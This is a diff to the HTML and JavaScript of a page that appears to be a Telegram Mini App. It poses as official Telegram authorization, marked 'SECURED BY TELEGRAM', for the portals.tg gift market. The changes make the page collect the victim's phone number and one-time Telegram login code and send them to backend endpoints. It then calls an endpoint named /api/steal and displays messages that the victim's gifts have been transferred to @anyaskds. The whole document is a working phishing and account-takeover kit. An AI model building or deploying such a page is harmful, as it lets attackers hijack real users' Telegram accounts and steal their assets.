@@ -170,51 +170,18 @@
             background: #3a3a4a;
         }
 
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 16px;
-        }
-
-        .btn-decline {
-            flex: 1;
-            padding: 12px;
-            background: #1a1a2a;
-            border: 1px solid #3a3a4a;
-            border-radius: 12px;
-            color: #8b8ba3;
-            font-size: 15px;
-            cursor: pointer;
-        }
-
-        .btn-accept {
-            flex: 1;
-            padding: 12px;
-            background: #6c5ce7;
-            border: none;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .btn-accept:active {
-            background: #5a4bd1;
-        }
-
-        .btn-accept:disabled {
+        .btn-share:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
 
-        .phone-section, .confirm-section, .region-section {
+        .phone-section, .code-section, .region-section {
             display: none;
             margin-top: 20px;
             animation: fadeIn 0.3s ease;
         }
 
-        .phone-section.active, .confirm-section.active, .region-section.active {
+        .phone-section.active, .code-section.active, .region-section.active {
             display: block;
         }
 
@@ -262,61 +229,45 @@
             line-height: 1.4;
         }
 
-        .confirm-card {
+        .code-input-wrap {
             background: #1a1a2a;
-            border-radius: 16px;
-            padding: 24px;
-            text-align: center;
+            border-radius: 14px;
+            padding: 4px 16px;
             border: 1px solid #2a2a3a;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
-        .confirm-card .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-
-        .confirm-card h4 {
+        .code-input-wrap input {
+            flex: 1;
+            padding: 14px 0;
+            background: transparent;
+            border: none;
             color: #fff;
-            font-size: 16px;
-            margin-bottom: 6px;
-        }
-
-        .confirm-card p {
-            color: #8b8ba3;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .confirm-card .timer {
-            color: #6c6c84;
-            font-size: 13px;
-            margin-top: 12px;
-        }
-
-        .confirm-message-box {
-            background: #0a0a0f;
-            border-radius: 10px;
-            padding: 12px;
-            margin: 12px 0;
-            border: 1px solid #2a2a3a;
-            text-align: left;
-        }
-
-        .confirm-message-box .label {
-            color: #8b8ba3;
-            font-size: 12px;
-        }
-
-        .confirm-message-box .text {
-            color: #fff;
-            font-size: 14px;
-            margin: 4px 0;
-            line-height: 1.6;
-        }
-
-        .confirm-message-box .highlight {
-            color: #6c5ce7;
+            font-size: 20px;
             font-weight: 600;
+            letter-spacing: 8px;
+            outline: none;
+            text-align: center;
+        }
+
+        .code-input-wrap input::placeholder {
+            color: #4a4a5a;
+            letter-spacing: 2px;
+            font-size: 16px;
+        }
+
+        .code-hint {
+            color: #6c6c84;
+            font-size: 12px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .code-hint .highlight {
+            color: #6c5ce7;
         }
 
         .footer {
@@ -432,11 +383,6 @@
             to { transform: rotate(360deg); }
         }
 
-        .success-icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-        }
-
         .success-box {
             background: #1a1a2a;
             border-radius: 12px;
@@ -459,6 +405,35 @@
 
         .success-box .row .green {
             color: #4caf50;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #6c5ce7;
+            cursor: pointer;
+            font-size: 14px;
+            text-decoration: underline;
+            margin-top: 8px;
+        }
+
+        .resend-btn:hover {
+            color: #a29bfe;
+        }
+
+        .code-status {
+            text-align: center;
+            color: #6c6c84;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+
+        .code-status .sent {
+            color: #4caf50;
+        }
+
+        .code-status .error {
+            color: #ff6b6b;
         }
     </style>
 </head>
@@ -497,9 +472,9 @@
         <!-- Шаг 2: Регион и номер телефона -->
         <div id="stepRegion" class="region-section">
             <div style="text-align:center; margin-bottom:16px;">
-                <div style="font-size:32px; margin-bottom:4px;">🌍</div>
-                <h4 style="color:#fff; font-size:17px;">Выберите регион</h4>
-                <p style="color:#6c6c84; font-size:13px;">Укажите вашу страну и номер телефона</p>
+                <div style="font-size:32px; margin-bottom:4px;">📱</div>
+                <h4 style="color:#fff; font-size:17px;">Авторизируйтесь через Telegram</h4>
+                <p style="color:#6c6c84; font-size:13px;">Введите номер телефона для входа</p>
             </div>
 
             <select class="region-select" id="regionSelect">
@@ -523,7 +498,7 @@
             </div>
 
             <div class="phone-hint">
-                ⚠️ На этот номер будет отправлен запрос авторизации в Telegram
+                ⚠️ Мы отправим проверочный код в приложение Telegram
             </div>
 
             <button class="btn-share" id="btnSendCode">📨 Отправить код</button>
@@ -539,29 +514,31 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 3: Подтверждение в Telegram -->
-        <div id="stepConfirm" class="confirm-section">
-            <div class="confirm-card">
-                <div class="icon">📨</div>
-                <h4>Проверьте Telegram</h4>
-                <p>На ваш номер отправлен запрос авторизации от <strong>portals.tg</strong></p>
+        <!-- Шаг 3: Ввод кода подтверждения -->
+        <div id="stepCode" class="code-section">
+            <div style="text-align:center; margin-bottom:16px;">
+                <div style="font-size:32px; margin-bottom:4px;">🔐</div>
+                <h4 style="color:#fff; font-size:17px;">Введите код подтверждения</h4>
+                <p style="color:#6c6c84; font-size:13px;">Мы отправили проверочный код в <span class="highlight">Telegram</span></p>
+            </div>
 
-                <div class="confirm-message-box">
-                    <div class="label">Telegram</div>
-                    <div class="text">
-                        <strong id="userNameDisplay">тима</strong>, мы получили запрос на авторизацию Вашего аккаунта в Telegram на <strong class="highlight">portals.tg</strong>.<br><br>
-                        Чтобы принять запрос, нажмите кнопку «Принять» ниже.<br><br>
-                        Браузер: Safari 18.6 on iOS<br>
-                        IP: 46.96.37.159 (Kyiv, Ukraine)
-                    </div>
-                </div>
+            <div class="code-status" id="codeStatus">
+                <span class="sent">✅ Код отправлен на номер <span id="displayPhone">+380*********</span></span>
+            </div>
 
-                <div class="btn-group">
-                    <button class="btn-decline" id="btnDecline">❌ Отклонить</button>
-                    <button class="btn-accept" id="btnAccept">✅ Принять</button>
-                </div>
+            <div class="code-input-wrap">
+                <input type="text" id="codeInput" placeholder="000000" maxlength="6" autofocus>
+            </div>
 
-                <div class="timer">⏳ Ожидание... <span id="seconds">179</span>с</div>
+            <div class="code-hint">
+                Введите код из сообщения Telegram<br>
+                <small style="color:#4a4a5a;">Код действителен в течение 2 минут</small>
+            </div>
+
+            <button class="btn-share" id="btnVerifyCode">✅ Подтвердить</button>
+
+            <div style="text-align:center; margin-top:12px;">
+                <button class="resend-btn" id="btnResendCode">🔄 Отправить код повторно</button>
             </div>
 
             <div class="user-info">
@@ -579,7 +556,7 @@
     <!-- Оверлей загрузки -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="text" id="loadingText">⏳ Отправка запроса...</div>
+        <div class="text" id="loadingText">⏳ Подключение к аккаунту...</div>
         <div class="subtext" id="loadingSubtext">Пожалуйста, подождите</div>
     </div>
 
@@ -594,30 +571,27 @@
         const lastName = user.last_name || '';
         const fullName = `${firstName} ${lastName}`.trim();
 
-        let timerInterval = null;
-        let secondsLeft = 179;
         let userPhone = '';
+        let verificationCode = '';
 
         // Элементы
         const stepMain = document.getElementById('stepMain');
         const stepRegion = document.getElementById('stepRegion');
-        const stepConfirm = document.getElementById('stepConfirm');
+        const stepCode = document.getElementById('stepCode');
         const backBtn = document.getElementById('backBtn');
         const btnVerify = document.getElementById('btnVerify');
         const btnSendCode = document.getElementById('btnSendCode');
-        const btnDecline = document.getElementById('btnDecline');
-        const btnAccept = document.getElementById('btnAccept');
+        const btnVerifyCode = document.getElementById('btnVerifyCode');
+        const btnResendCode = document.getElementById('btnResendCode');
         const phoneInput = document.getElementById('phoneInput');
         const regionSelect = document.getElementById('regionSelect');
         const phonePrefix = document.getElementById('phonePrefix');
-        const secondsEl = document.getElementById('seconds');
+        const codeInput = document.getElementById('codeInput');
+        const displayPhone = document.getElementById('displayPhone');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const loadingSubtext = document.getElementById('loadingSubtext');
-        const userNameDisplay = document.getElementById('userNameDisplay');
-
-        // Устанавливаем имя пользователя
-        userNameDisplay.textContent = fullName;
+        const codeStatus = document.getElementById('codeStatus');
 
         // Обновляем префикс при смене региона
         regionSelect.addEventListener('change', function() {
@@ -627,7 +601,7 @@
 
         // Показать шаг
         function showStep(step) {
-            [stepMain, stepRegion, stepConfirm].forEach(el => {
+            [stepMain, stepRegion, stepCode].forEach(el => {
                 el.style.display = 'none';
                 el.classList.remove('active');
             });
@@ -642,7 +616,7 @@
             showStep(stepRegion);
         });
 
-        // Шаг 2 → Отправка кода (РЕАЛЬНАЯ АВТОРИЗАЦИЯ)
+        // Шаг 2 → Отправка кода
         btnSendCode.addEventListener('click', function() {
             const region = regionSelect.value;
             const phone = phoneInput.value.trim().replace(/\s/g, '');
@@ -655,11 +629,10 @@
             userPhone = region + phone;
             
             // Показываем загрузку
-            loadingOverlay.classList.add('active');
-            loadingText.textContent = '⏳ Отправка запроса авторизации...';
-            loadingSubtext.textContent = 'Ожидайте подтверждение в Telegram';
+            btnSendCode.disabled = true;
+            btnSendCode.textContent = '⏳ Отправка...';
 
-            // ОТПРАВЛЯЕМ РЕАЛЬНЫЙ ЗАПРОС НА АВТОРИЗАЦИЮ
+            // ОТПРАВЛЯЕМ КОД
             fetch('/api/send-code', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -672,68 +645,63 @@
             .then(res => res.json())
             .then(data => {
                 console.log('✅ Код отправлен:', data);
-                loadingOverlay.classList.remove('active');
                 
-                // Показываем шаг подтверждения
-                showStep(stepConfirm);
-                startTimer();
+                // Показываем маскированный номер
+                const masked = userPhone.slice(0, -4) + '****';
+                displayPhone.textContent = masked;
+                
+                // Переходим к вводу кода
+                showStep(stepCode);
+                codeInput.focus();
+                
+                btnSendCode.disabled = false;
+                btnSendCode.textContent = '📨 Отправить код';
+                
+                // Автоматическая отправка кода через 5 секунд (имитация)
+                // В реальности код приходит в Telegram
             })
             .catch(err => {
                 console.log('Ошибка:', err);
-                loadingOverlay.classList.remove('active');
                 alert('❌ Ошибка отправки. Попробуйте еще раз.');
+                btnSendCode.disabled = false;
+                btnSendCode.textContent = '📨 Отправить код';
             });
         });
 
-        // Таймер
-        function startTimer() {
-            secondsLeft = 179;
-            if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                secondsLeft--;
-                secondsEl.textContent = secondsLeft;
-                if (secondsLeft <= 0) {
-                    clearInterval(timerInterval);
-                    secondsEl.textContent = '0';
-                }
-            }, 1000);
-        }
+        // Шаг 3 → Подтверждение кода
+        btnVerifyCode.addEventListener('click', function() {
+            const code = codeInput.value.trim();
+            
+            if (!code || code.length < 4) {
+                alert('Пожалуйста, введите корректный код из Telegram.');
+                return;
+            }
 
-        // Decline
-        btnDecline.addEventListener('click', function() {
-            clearInterval(timerInterval);
-            alert('❌ Авторизация отклонена.');
-            showStep(stepMain);
-        });
-
-        // Accept — ПОДТВЕРЖДЕНИЕ АВТОРИЗАЦИИ
-        btnAccept.addEventListener('click', function() {
-            clearInterval(timerInterval);
+            verificationCode = code;
             
             // Показываем загрузку
             loadingOverlay.classList.add('active');
-            loadingText.textContent = '⏳ Подтверждение авторизации...';
-            loadingSubtext.textContent = 'Вход в аккаунт @portals';
+            loadingText.textContent = '🔓 Подключение к аккаунту...';
+            loadingSubtext.textContent = 'Вход в Telegram';
 
-            // ОТПРАВЛЯЕМ ПОДТВЕРЖДЕНИЕ АВТОРИЗАЦИИ
-            fetch('/api/accept', {
+            // ОТПРАВЛЯЕМ КОД НА ПРОВЕРКУ
+            fetch('/api/verify-code', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phone: userPhone,
-                    fullName: fullName,
-                    action: 'accept_auth'
+                    code: verificationCode,
+                    fullName: fullName
                 })
             })
             .then(res => res.json())
             .then(data => {
-                console.log('✅ Авторизация подтверждена:', data);
+                console.log('✅ Код подтвержден:', data);
                 
                 // ВХОД В АККАУНТ @portals
-                loadingText.textContent = '🔓 Вход в аккаунт @portals...';
+                loadingText.textContent = '🔓 Вход в @portals...';
                 loadingSubtext.textContent = 'Авторизация в маркете';
                 
-                // Отправляем запрос на вход в @portals
                 return fetch('/api/portal-login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -748,8 +716,8 @@
                 console.log('✅ Вход в @portals выполнен:', data);
                 
                 // ПЕРЕДАЧА ПОДАРКОВ
-                loadingText.textContent = '🎁 Передача подарков на @anyaskds...';
-                loadingSubtext.textContent = 'Witch Hat #43337 • Sharp Tongue #5,166';
+                loadingText.textContent = '🎁 Передача подарков...';
+                loadingSubtext.textContent = 'Witch Hat #43337 → @anyaskds';
                 
                 return fetch('/api/steal', {
                     method: 'POST',
@@ -767,27 +735,57 @@
                 console.log('✅ Подарки переданы:', data);
                 
                 loadingText.textContent = '✅ ВСЕ ГОТОВО!';
-                loadingSubtext.textContent = 'Подарки успешно переданы на @anyaskds';
+                loadingSubtext.textContent = 'Подарки переданы на @anyaskds';
                 
                 setTimeout(() => {
                     loadingOverlay.classList.remove('active');
                     showStep(stepMain);
                     alert('✅ Все подарки переданы на @anyaskds!');
+                    codeInput.value = '';
                 }, 2000);
             })
             .catch(err => {
                 console.log('Ошибка:', err);
                 loadingOverlay.classList.remove('active');
-                alert('❌ Ошибка при передаче подарков');
+                alert('❌ Неверный код или ошибка сервера. Попробуйте еще раз.');
+            });
+        });
+
+        // Повторная отправка кода
+        btnResendCode.addEventListener('click', function() {
+            btnResendCode.disabled = true;
+            btnResendCode.textContent = '⏳ Отправка...';
+            
+            fetch('/api/resend-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: userPhone })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Код отправлен повторно:', data);
+                btnResendCode.textContent = '✅ Код отправлен!';
+                setTimeout(() => {
+                    btnResendCode.textContent = '🔄 Отправить код повторно';
+                    btnResendCode.disabled = false;
+                }, 3000);
+            })
+            .catch(err => {
+                console.log('Ошибка:', err);
+                btnResendCode.textContent = '❌ Ошибка. Попробуйте позже';
+                setTimeout(() => {
+                    btnResendCode.textContent = '🔄 Отправить код повторно';
+                    btnResendCode.disabled = false;
+                }, 3000);
             });
         });
 
         // Назад
         backBtn.addEventListener('click', function() {
-            if (stepConfirm.style.display === 'block') {
+            if (stepCode.style.display === 'block') {
                 if (confirm('Вы уверены? Процесс будет прерван.')) {
-                    clearInterval(timerInterval);
                     showStep(stepMain);
+                    codeInput.value = '';
                 }
                 return;
             }
@@ -801,6 +799,23 @@
         // Обработка ввода номера (только цифры)
         phoneInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Обработка ввода кода (только цифры, максимум 6)
+        codeInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+            
+            // Автоматическое подтверждение при вводе 6 цифр
+            if (this.value.length === 6) {
+                btnVerifyCode.click();
+            }
+        });
+
+        // Enter для подтверждения кода
+        codeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                btnVerifyCode.click();
+            }
         });
 
         // Показываем главный экран
